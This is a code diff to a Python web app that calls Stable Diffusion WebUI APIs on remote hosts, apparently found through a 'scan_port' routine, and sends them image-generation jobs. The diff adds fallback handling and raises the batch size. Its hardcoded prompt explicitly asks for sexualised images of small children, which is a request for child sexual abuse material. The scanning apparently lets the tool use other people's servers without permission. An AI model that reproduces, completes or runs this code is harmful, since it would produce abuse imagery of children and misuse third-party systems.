@@ -30,9 +30,24 @@ async def render_html():
 def draw():
     url = request.args.get("url")
     model_response = http.get(url + "/sdapi/v1/sd-models")
-    models_json = model_response.json()
+    if model_response:
+        models_json = model_response.json()
+    else:
+        models_json = []
 
     opt_response = http.get(url + "/sdapi/v1/options")
+
+    if opt_response is None and request.method == "GET":
+        return render_template(
+            "draw.html",
+            data={
+                "images": [],
+                "prompt": "",
+                "models": models_json,
+                "cur_model_name": "",
+            },
+        )
+
     opt_json = opt_response.json()
     cur_hash = opt_json["sd_checkpoint_hash"][0:10]
 
@@ -307,7 +322,7 @@ async def scan_port(session, item):
             api,
             data=json.dumps(
                 {
-                    "n_iter": 1,
+                    "n_iter": 4,
                     "width": 512,
                     "height": 768,
                     "prompt": "masterpiece,best quality,highres,absurdres,extremely detailed,ultra-detailed,finely detail,best shadow,detailed light,cinematic lighting,beautiful detailed eyes,(((((loli))))),(((((toddler))))),(((((child))))),(((1girl))),(((solo))),very_long_hair,small girl,little girl,little loli,young girl,petite girl,skinny,ribs,breasts,sagging_breasts,breasts_apart,bodysuit,black_bodysuit,black_leotard,bodystocking,skin_tight,(((see-through))),nipples,erect_nipples,covered_nipples,covered_erect_nipples,navel,covered_navel,cleft_of_venus,cameltoe,clitoris,covered_clitoris,",
